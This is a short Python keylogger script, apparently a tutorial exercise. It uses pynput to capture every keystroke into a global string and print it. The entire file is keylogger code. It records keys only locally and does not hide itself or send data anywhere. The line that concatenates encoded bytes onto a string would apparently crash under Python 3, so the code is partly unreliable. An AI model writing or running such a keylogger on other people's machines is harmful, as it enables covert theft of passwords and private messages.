import pynput.keyboard

# creating a listener object and a call back function

log = ""


# within the callback function, the on press method will forward the keys that are being pressed
def callback_function(key):
    global log
    try:
        log = log + key.char.encode("utf-8")
        # log = log + str(key)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    print(log)


keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()  # starts the listener
